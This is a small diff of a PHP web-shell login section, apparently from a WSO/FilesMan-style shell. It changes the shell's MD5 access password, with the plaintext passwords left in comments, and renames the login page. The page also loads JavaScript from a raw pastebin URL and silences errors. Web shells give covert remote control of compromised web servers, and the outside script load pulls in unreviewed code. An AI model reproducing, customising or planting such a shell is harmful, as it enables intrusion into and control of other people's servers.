@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "2f564cc3c35c1429f94e41a8f155db4c"; // default: n00b_tamvan
+$auth_pass = "c036b8a26fc84edb0f50e762026ff852"; // default: Muhidayat
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -28,7 +28,7 @@ function login_shell() {
 <html>
 <head>
 <script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
-<title>Login</title>
+<title>Login Mas</title>
 <audio autoplay> <source src="http://www.soundjay.com/button/beep-24.wav" type="audio/mpeg"></audio>
 <link href="https://fonts.googleapis.com/css?family=Patrick Hand" rel="stylesheet">
 <style type="text/css">
